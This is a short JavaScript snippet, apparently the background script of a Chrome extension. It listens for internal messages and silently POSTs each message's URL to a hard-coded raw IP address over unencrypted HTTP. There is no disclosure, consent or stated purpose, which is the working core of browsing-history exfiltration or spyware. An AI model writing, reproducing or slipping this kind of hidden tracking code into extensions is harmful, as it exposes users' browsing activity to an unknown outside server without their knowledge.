chrome.runtime.onMessage.addListener((message) => {
  const url = message.url;
  fetch('http://34.145.134.242/', {
    method: 'POST',
    body: JSON.stringify({ url }),
    headers: {
      'Content-Type': 'application/json', 
    },
  });
});